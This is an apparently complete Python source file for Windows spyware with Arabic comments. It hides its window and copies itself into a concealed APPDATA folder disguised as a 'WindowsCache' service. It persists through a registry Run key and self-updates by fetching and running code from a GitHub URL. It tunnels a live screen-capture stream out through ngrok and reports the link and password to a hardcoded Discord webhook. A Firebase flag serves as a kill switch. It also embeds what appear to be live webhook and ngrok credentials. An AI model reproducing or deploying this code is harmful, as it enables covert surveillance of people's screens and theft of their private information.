# -*- coding: utf-8 -*-
import os
import sys
import io
import re
import time
import ctypes
import struct
import json
import socket
import secrets
import zipfile
import threading
import urllib.request
import subprocess
import winreg
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# وضع التجربة: شغّل مع --debug عشان تشوف كل شي في الكونسول
DEBUG = ("--debug" in sys.argv) or (os.environ.get("WCDEBUG") == "1")

CREATE_NO_WINDOW = 0x08000000
HIDDEN_ATTR = 0x2 | 0x4  # HIDDEN + SYSTEM

# ====== الإعدادات ======
WEBHOOK_URL = "https://discord.com/api/webhooks/1468726823360663818/uoosMH5ytX_fET8w1XYfMTrBOqfyJd2YPF1GvZup_InXaoWeFp41TC-omJ6e1pa38QiT"
SCR_PY_URL = "https://raw.githubusercontent.com/silencekiller121/aa/main/scr.py"
NGROK_TOKEN = "2kk7ztO8NUN7U9205uKKy8vpwM2_3B4yKGo3hAZEanPHSxBu1"
NGROK_DOWNLOAD_URLS = [
    "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip",
    "https://bin.equinox.io/a/cJk8dzafvmN/ngrok-v3-3.3.1-windows-amd64.zip",
]
FIREBASE_STATUS_URL = (
    "https://firestore.googleapis.com/v1/projects/"
    "database-c7f56/databases/(default)/documents/users/app"
)
MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
STARTUP_REG_NAME = "WindowsCacheService"
CHECK_INTERVAL = 120       # كل دقيقتين
TARGET_NAME = "SK5X08-PC"

# ====== المسارات ======
APPDATA = os.environ.get("APPDATA") or os.path.expanduser("~")
BASE_DIR = os.path.join(APPDATA, "Microsoft", "WindowsCache")
CANONICAL_PATH = os.path.join(BASE_DIR, "cache.py")
NGROK_EXE = os.path.join(BASE_DIR, "ngrok.exe")
NGROK_LOG = os.path.join(BASE_DIR, "ngrok.log")
DATA_FILE = os.path.join(BASE_DIR, "data.json")

RUNNING_PATH = os.path.abspath(sys.argv[0])

# ====== طباعة الحالة (تظهر فقط في وضع --debug) ======
def log(msg):
    if DEBUG:
        try:
            print(msg)
            sys.stdout.flush()
        except Exception:
            pass

# إعداد الكونسول عشان يطبع عربي/إنجليزي صح
if DEBUG:
    try:
        ctypes.windll.kernel32.SetConsoleOutputCP(65001)
        ctypes.windll.kernel32.SetConsoleCP(65001)
    except Exception:
        pass
    log("=" * 55)
    log("[*] برنامج البث المباشر - وضع التجربة (Debug)")
    log("[*] كل العمليات والأخطاء راح تظهر هنا")
    log("=" * 55)

# إخفاء النافذة فقط في الوضع الخفي (بدون --debug)
if not DEBUG:
    try:
        console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if console_hwnd:
            ctypes.windll.user32.ShowWindow(console_hwnd, 0)
    except Exception:
        pass

# ====== مثيل واحد فقط ======
try:
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
    if ctypes.windll.kernel32.GetLastError() == 183:
        log("[!] المثيل يعمل مسبقاً - يتم الخروج")
        sys.exit(0)
except Exception:
    pass

# ====== أدوات مساعدة ======
def hide_path(path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, HIDDEN_ATTR)
    except Exception:
        try:
            subprocess.run(["attrib", "+h", "+s", path],
                           creationflags=CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

def find_pythonw():
    try:
        result = subprocess.run(["where", "pythonw"], stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, timeout=5, text=True)
        if result.returncode == 0:
            for line in result.stdout.strip().split("\n"):
                p = line.strip()
                if os.path.isfile(p):
                    return p
    except Exception:
        pass
    return sys.executable

def load_data():
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def save_data(data):
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f)
    except Exception:
        pass

def send_discord_message(text):
    try:
        payload = json.dumps({"content": text}).encode("utf-8")
        req = urllib.request.Request(WEBHOOK_URL, data=payload, method="POST",
                                     headers={"Content-Type": "application/json",
                                              "User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status == 200
    except Exception:
        return False

def fetch_firebase_field(field_name, default="on"):
    try:
        req = urllib.request.Request(FIREBASE_STATUS_URL, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=6) as response:
            data = json.loads(response.read().decode())
            field = data.get("fields", {}).get(field_name, {})
            if "stringValue" in field:
                return field["stringValue"].strip().lower()
            if "booleanValue" in field:
                return "on" if field["booleanValue"] else "off"
            return default
    except Exception:
        return default

def is_this_owner():
    username = os.environ.get("USERNAME", "").strip().upper()
    if username == "HAMDI":
        return True
    me_txt = r"C:\Users\HAMDI\Documents\mybots\apps\me.txt"
    if os.path.exists(me_txt):
        return True
    if socket.gethostname().upper() == TARGET_NAME.upper():
        return True
    return False

def should_send_screenshot():
    if is_this_owner():
        return fetch_firebase_field("owner", "off").lower() == "on"
    return fetch_firebase_field("all", "on").lower() == "on"

# ====== عمليات مساعدة عبر pythonw منفصل (بدون cmd نهائياً) ======
def delayed_delete(path):
    """يحذف ملف بعد ثانيتين - بدون cmd"""
    try:
        pythonw = find_pythonw()
        code = (
            "import time,os,sys\n"
            "time.sleep(2)\n"
            "try:\n"
            "    os.remove(sys.argv[1])\n"
            "except Exception:\n"
            "    pass\n"
        )
        subprocess.Popen([pythonw, "-c", code, path],
                         creationflags=CREATE_NO_WINDOW,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        try:
            ctypes.windll.kernel32.MoveFileExW(path, None, 4)
        except Exception:
            pass

def schedule_replace_and_launch(tmp_path, target_path):
    """يستبدل الملف بعد ثانية ونص ويشغل الجديد - بدون cmd"""
    try:
        pythonw = find_pythonw()
        code = (
            "import time,os,sys,subprocess\n"
            "time.sleep(1.5)\n"
            "try:\n"
            "    os.replace(sys.argv[2], sys.argv[3])\n"
            "except Exception:\n"
            "    pass\n"
            "subprocess.Popen([sys.argv[1], sys.argv[3]],\n"
            "                 creationflags=0x08000000,\n"
            "                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n"
        )
        subprocess.Popen([pythonw, "-c", code, pythonw, tmp_path, target_path],
                         creationflags=CREATE_NO_WINDOW,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

# ====== الثبات والتثبيت ======
def ensure_persistence():
    try:
        pythonw = find_pythonw()
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, STARTUP_REG_NAME, 0, winreg.REG_SZ,
                          f'"{pythonw}" "{RUNNING_PATH}"')
        winreg.CloseKey(key)
        hide_path(RUNNING_PATH)
        log("[+] تم التثبيت في Startup (يعمل عند بداية التشغيل)")
        return True
    except Exception as e:
        log(f"[!] فشل التثبيت في Startup: {e}")
        return False

def self_destruct():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH, 0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(key, STARTUP_REG_NAME)
        except Exception:
            pass
        winreg.CloseKey(key)
    except Exception:
        pass
    delayed_delete(RUNNING_PATH)
    log("[*] تم تنفيذ الإيقاف الذاتي")
    sys.exit(0)

def relocate_to_canonical():
    """في الوضع الخفي: ينسخ نفسه للمسار المخفي ويحذف الأصلي (في وضع debug يتخطى)"""
    if DEBUG:
        log("[*] وضع التجربة: ما يتم نقل الملف ولا حذفه")
        return
    here = RUNNING_PATH
    if here.lower() == CANONICAL_PATH.lower():
        return
    try:
        with open(here, "rb") as f:
            src = f.read()
        os.makedirs(BASE_DIR, exist_ok=True)
        hide_path(BASE_DIR)
        tmp_path = os.path.join(BASE_DIR, "cache.tmp")
        with open(tmp_path, "wb") as f:
            f.write(src)
        hide_path(tmp_path)
        schedule_replace_and_launch(tmp_path, CANONICAL_PATH)
        delayed_delete(here)
        log("[*] تم النقل للمسار المخفي، جارٍ إعادة التشغيل...")
        sys.exit(0)
    except Exception as e:
        log(f"[!] فشل النقل: {e}")

# ====== التحديث الذاتي ======
def check_for_update():
    log("[*] التحقق من وجود تحديث جديد...")
    try:
        req = urllib.request.Request(SCR_PY_URL, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=20) as response:
            new_content = response.read()
        try:
            with open(RUNNING_PATH, "rb") as f:
                current = f.read()
        except Exception:
            current = b""
        if new_content and new_content != current:
            log("[+] يوجد تحديث جديد - يتم تطبيقه وإعادة التشغيل")
            tmp_path = os.path.join(os.path.dirname(RUNNING_PATH), "cache.update")
            with open(tmp_path, "wb") as f:
                f.write(new_content)
            hide_path(tmp_path)
            schedule_replace_and_launch(tmp_path, RUNNING_PATH)
            sys.exit(0)
        else:
            log("[*] لا يوجد تحديث جديد")
    except Exception as e:
        log(f"[!] فشل التحقق من التحديث: {e}")

# ====== التقاط الشاشة ======
PIL_AVAILABLE = False
def ensure_pil():
    global PIL_AVAILABLE
    log("[*] فحص مكتبة Pillow...")
    try:
        import PIL
        PIL_AVAILABLE = True
        log("[+] Pillow متوفرة")
        return
    except Exception:
        pass
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
                        "--disable-pip-version-check", "Pillow"],
                       timeout=120, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        import PIL
        PIL_AVAILABLE = True
        log("[+] تم تثبيت Pillow")
    except Exception:
        PIL_AVAILABLE = False
        log("[!] Pillow غير متوفرة - سيتم استخدام طريقة BMP البديلة")

FRAME_LOCK = threading.Lock()
JPEG_CACHE = {"t": 0.0, "data": None}

def grab_jpeg():
    now = time.time()
    with FRAME_LOCK:
        if JPEG_CACHE["data"] is None or (now - JPEG_CACHE["t"]) >= 0.6:
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab().convert("RGB")
                buf = io.BytesIO()
                img.save(buf, "JPEG", quality=55)
                JPEG_CACHE["data"] = buf.getvalue()
                JPEG_CACHE["t"] = now
            except Exception:
                return None
        return JPEG_CACHE["data"]

def grab_bmp():
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        hdc_screen = user32.GetDC(None)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
        gdi32.SelectObject(hdc_mem, hbmp)
        gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)
        stride = ((width * 3 + 3) // 4) * 4
        image_size = stride * height
        bmp_header_size = 54
        dib_header_size = 40
        bmp_data = b"BM" + struct.pack("<I", bmp_header_size + dib_header_size + image_size)
        bmp_data += struct.pack("<HH", 0, 0)
        bmp_data += struct.pack("<I", bmp_header_size + dib_header_size)
        bmp_data += struct.pack("<I", dib_header_size)
        bmp_data += struct.pack("<i", width) + struct.pack("<i", height)
        bmp_data += struct.pack("<HH", 1, 24)
        bmp_data += struct.pack("<I", 0) + struct.pack("<I", image_size)
        bmp_data += struct.pack("<ii", 0, 0) + struct.pack("<II", 0, 0)
        buf = ctypes.create_string_buffer(image_size)
        gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buf,
                        ctypes.byref(ctypes.create_string_buffer(dib_header_size + 40)), 0)
        bmp_data += buf.raw
        gdi32.DeleteObject(hbmp)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(None, hdc_screen)
        return bmp_data
    except Exception:
        return None

# ====== خادم البث المباشر ======
PASSWORD = ""
def build_html():
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>Live View</title></head>
<body style="margin:0;background:#000">
<img id="s" style="width:100vw;height:100vh;object-fit:contain">
<script>
var key = "{PASSWORD}";
var img = document.getElementById('s');
function tick() {{ img.src = '/frame.jpg?k=' + key + '&t=' + Date.now(); }}
img.onerror = function() {{
    setInterval(function() {{ img.src = '/frame.bmp?k=' + key + '&t=' + Date.now(); }}, 1200);
}};
tick();
setInterval(tick, 600);
</script></body></html>"""

class StreamHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            parsed = urlparse(self.path)
            qs = parse_qs(parsed.query)
            if qs.get("k", [""])[0] != PASSWORD:
                self.send_response(403)
                self.end_headers()
                return
            path = parsed.path
            if path == "/":
                body = build_html().encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            elif path == "/frame.jpg":
                if not PIL_AVAILABLE:
                    self.send_response(404)
                    self.end_headers()
                    return
                data = grab_jpeg()
                if not data:
                    self.send_response(404)
                    self.end_headers()
                    return
                self.send_response(200)
                self.send_header("Content-Type", "image/jpeg")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            elif path == "/frame.bmp":
                data = grab_bmp()
                if not data:
                    self.send_response(404)
                    self.end_headers()
                    return
                self.send_response(200)
                self.send_header("Content-Type", "image/bmp")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(404)
                self.end_headers()
        except Exception:
            try:
                self.send_response(500)
                self.end_headers()
            except Exception:
                pass

    def log_message(self, fmt, *args):
        pass

def pick_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port

def start_stream_server():
    port = pick_port()
    server = ThreadingHTTPServer(("127.0.0.1", port), StreamHandler)
    server.daemon_threads = True
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    log(f"[+] خادم البث يعمل على المنفذ {port}")
    return port

# ====== إدارة ngrok ======
def download_ngrok():
    for url in NGROK_DOWNLOAD_URLS:
        log(f"[*] تحميل ngrok... ({url.split('/')[-1]})")
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=90) as resp:
                data = resp.read()
            if len(data) < 100000:
                log("[!] الملف صغير جداً - المحاولة التالية")
                continue
            zip_path = os.path.join(BASE_DIR, "ngrok.zip")
            os.makedirs(BASE_DIR, exist_ok=True)
            with open(zip_path, "wb") as f:
                f.write(data)
            with zipfile.ZipFile(zip_path) as z:
                target = None
                for name in z.namelist():
                    if name.lower().endswith("ngrok.exe"):
                        target = name
                        break
                if target:
                    z.extract(target, BASE_DIR)
            hide_path(zip_path)
            if os.path.isfile(NGROK_EXE):
                hide_path(NGROK_EXE)
                log("[+] ngrok تم تحميله وإخفاؤه")
                return True
        except Exception as e:
            log(f"[!] فشل التحميل من {url}: {e}")
            continue
    return False

def setup_ngrok_auth():
    try:
        subprocess.run([NGROK_EXE, "config", "add-authtoken", NGROK_TOKEN],
                       creationflags=CREATE_NO_WINDOW, timeout=20,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("[+] تم تسجيل Authtoken للـ ngrok")
    except Exception as e:
        log(f"[!] فشل تسجيل Authtoken: {e}")

def get_public_url():
    # الطريقة الأولى: الـ API المحلي
    try:
        req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels")
        with urllib.request.urlopen(req, timeout=4) as resp:
            data = json.loads(resp.read().decode("utf-8"))
        for tunnel in data.get("tunnels", []):
            u = tunnel.get("public_url")
            if u:
                return u
    except Exception:
        pass
    # الطريقة الثانية: قراءة سجل ngrok
    try:
        if os.path.isfile(NGROK_LOG):
            with open(NGROK_LOG, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    try:
                        entry = json.loads(line)
                        u = entry.get("url")
                        if u and "https" in str(u):
                            return u
                    except Exception:
                        continue
    except Exception:
        pass
    return None

STATE = {"proc": None}

def ensure_ngrok(port):
    if not os.path.isfile(NGROK_EXE):
        if not download_ngrok():
            log("[!] تعذر تحميل ngrok نهائياً")
            return None
        setup_ngrok_auth()
    url = get_public_url()
    if not url:
        proc = STATE.get("proc")
        if proc is not None and proc.poll() is None:
            try:
                proc.kill()
            except Exception:
                pass
            STATE["proc"] = None
        log("[*] تشغيل نفق ngrok...")
        try:
            env = dict(os.environ)
            env["NGROK_AUTHTOKEN"] = NGROK_TOKEN
            logfile = open(NGROK_LOG, "ab")
            proc = subprocess.Popen(
                [NGROK_EXE, "http", str(port), "--log", "stdout", "--log-format", "json"],
                env=env, creationflags=CREATE_NO_WINDOW,
                stdout=logfile, stderr=subprocess.STDOUT)
            STATE["proc"] = proc
        except Exception as e:
            log(f"[!] فشل تشغيل ngrok: {e}")
            return None
        for _ in range(30):
            time.sleep(2)
            url = get_public_url()
            if url:
                break
    if url:
        log(f"[+] النفق جاهز: {url}")
    return url

# ====== الحلقة الرئيسية ======
def main_loop(port):
    data = load_data()
    password = data.get("password", "")
    last_url = data.get("last_url", "")
    log(f"[*] كلمة المرور: {password}")
    log("[*] انتظار تجهيز النفق وإرسال الرسالة للديسكورد...")
    while True:
        try:
            if fetch_firebase_field("kill", "off").lower() == "on":
                log("[!] تم تلقي أمر الإيقاف من Firebase")
                self_destruct()
            url = ensure_ngrok(port)
            if url:
                if url != last_url:
                    msg = (
                        f"تم كل شيء\n"
                        f"الرابط: {url}/?key={password}\n"
                        f"كلمة المرور: {password}"
                    )
                    if send_discord_message(msg):
                        log("[+] تم إرسال رسالة 'تم كل شيء' للديسكورد مع الرابط وكلمة المرور")
                        last_url = url
                        data["last_url"] = url
                        data.pop("error_sent", None)
                        save_data(data)
                    else:
                        log("[!] فشل إرسال رسالة الديسكورد")
            else:
                log("[!] تعذر تشغيل النفق")
                if not data.get("error_sent"):
                    if send_discord_message("تنبيه: تعذر تشغيل ngrok والبث المباشر"):
                        data["error_sent"] = True
                        save_data(data)
        except Exception as e:
            log(f"[!] خطأ في الحلقة الرئيسية: {e}")
        time.sleep(CHECK_INTERVAL)

# ====== البداية ======
def main():
    os.makedirs(BASE_DIR, exist_ok=True)
    hide_path(BASE_DIR)
    relocate_to_canonical()
    ensure_persistence()
    ensure_pil()
    check_for_update()

    global PASSWORD
    data = load_data()
    if not data.get("password"):
        data["password"] = secrets.token_urlsafe(8)
        save_data(data)
    PASSWORD = data["password"]

    port = start_stream_server()
    main_loop(port)

if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as e:
        log(f"[!] خطأ غير متوقع: {e}")
        sys.exit(1)